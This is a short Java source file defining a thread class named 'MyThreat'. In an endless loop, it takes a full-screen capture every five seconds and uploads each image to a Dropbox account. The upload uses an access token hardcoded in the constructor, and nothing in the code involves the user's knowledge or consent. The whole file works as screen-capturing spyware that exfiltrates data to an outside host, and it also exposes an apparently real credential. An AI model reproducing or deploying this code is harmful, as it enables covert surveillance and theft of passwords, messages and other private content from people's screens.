import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThreat extends Thread {
    private DbxClientV2 client;
    private DateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
    MyThreat(){
        String ACCESS_TOKEN = "xwTX64uaERgAAAAAAAABHv0K-Rwl5QFjZfPC-yNkiky4KUXr1eRhHFtiAe_Kz1bu";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        client = new DbxClientV2(config, ACCESS_TOKEN);
    }
    public void run(){
        for (;;) { try {sleep(5000);} catch (Exception e){e.printStackTrace();}

            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            byte[] imageByte = null;
            try {
                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()); //размер экрана
                BufferedImage image = new Robot().createScreenCapture(screenRect); //сохраняем скрин в буфер
                ImageIO.write(image,"png", outputStream);
                outputStream.flush();
                imageByte=outputStream.toByteArray();
                outputStream.close();
            } catch (Exception e) {e.printStackTrace();}

            try {
                ByteArrayInputStream in = new ByteArrayInputStream (imageByte);
                FileMetadata metadata = client
                        .files()
                        .uploadBuilder("/" + dateFormat.format(new Date()) + ".png")
                        .uploadAndFinish(in);
            } catch (Exception e){e.printStackTrace();}
        }
    }
}
